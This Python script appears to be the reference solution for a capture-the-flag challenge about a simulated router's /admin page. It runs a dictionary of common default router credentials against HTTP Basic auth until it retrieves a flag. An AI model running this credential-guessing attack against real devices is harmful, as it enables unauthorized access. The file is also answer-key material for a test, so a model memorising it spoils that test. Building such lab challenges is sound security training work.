#!/usr/bin/env python3
"""Reference exploit for auth1 (NetGuard Router).

/admin is gated by HTTP Basic auth with a weak, never-rotated default
credential. We first confirm the endpoint actually rejects an unauthenticated
request (the "is there a challenge" check -- AGENTS.md / the auth plan §2c),
then try a short dictionary of common router default logins until one works.
"""
import base64
import os
import re
import sys
import time

import requests  # pip install requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("BASE", "http://127.0.0.1:8060")

# A short dictionary of common shipped router defaults -- not the specific
# value itself, so a config change (see solution/README.md "perturbation")
# still gets found.
CANDIDATES = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "12345"),
    ("admin", "admin123"),
    ("admin", "letmein"),
    ("root", "root"),
]


def wait_up(s: requests.Session) -> None:
    for _ in range(30):
        try:
            s.get(BASE, timeout=2)
            return
        except requests.RequestException:
            time.sleep(1)


def main() -> int:
    s = requests.Session()
    wait_up(s)

    # Pre-exploit: no credential at all must NOT return the flag.
    r = s.get(f"{BASE}/admin", timeout=5)
    if r.status_code != 401 or "flag{" in r.text:
        sys.stderr.write("precondition failed: /admin reachable without auth\n")
        return 1

    for user, pw in CANDIDATES:
        token = base64.b64encode(f"{user}:{pw}".encode()).decode()
        r = s.get(f"{BASE}/admin", headers={"Authorization": f"Basic {token}"}, timeout=5)
        if r.status_code == 200:
            m = re.search(r"flag\{[^}]+\}", r.text)
            if m:
                print(m.group(0))
                return 0

    sys.stderr.write("no flag found -- dictionary exhausted\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
